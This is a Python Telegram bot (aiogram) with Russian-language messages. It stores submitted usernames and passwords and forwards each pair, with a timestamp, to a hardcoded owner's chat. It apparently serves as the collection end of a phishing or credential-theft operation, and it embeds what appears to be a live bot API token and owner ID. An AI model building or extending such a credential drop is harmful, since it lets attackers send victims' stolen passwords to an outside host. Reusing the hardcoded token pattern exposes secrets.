from aiogram import Bot, Dispatcher, types
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.enums.parse_mode import ParseMode
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties
from datetime import datetime
import asyncio

API_TOKEN = '7858083760:AAHPAfQXOWnkphIEDFOQbCPetuJCta9Jdx4'
OWNER_ID = 1686153131

bot = Bot(
    token=API_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher(storage=MemoryStorage())


logins = []  # список логинов (в памяти)

@dp.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id == OWNER_ID:
        await message.answer("✅ Бот запущен. Жду логины.")
    else:
        await message.answer("❌ У тебя нет доступа.")

@dp.message(Command("logins"))
async def cmd_logins(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    if not logins:
        await message.answer("📭 Пока логинов нет.")
    else:
        text = "🗂 <b>Список логинов:</b>\n\n" + "\n\n".join(logins)
        await message.answer(text)

async def add_login(username, password):
    now = datetime.now().strftime("%d.%m.%Y %H:%M")
    msg = (
        f"<b>🔐 Новый логин</b>\n"
        f"👤 <b>Логин:</b> {username}\n"
        f"🔑 <b>Пароль:</b> {password}\n"
        f"📅 <b>Время:</b> {now}"
    )
    logins.append(msg)
    await bot.send_message(chat_id=OWNER_ID, text=msg)

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
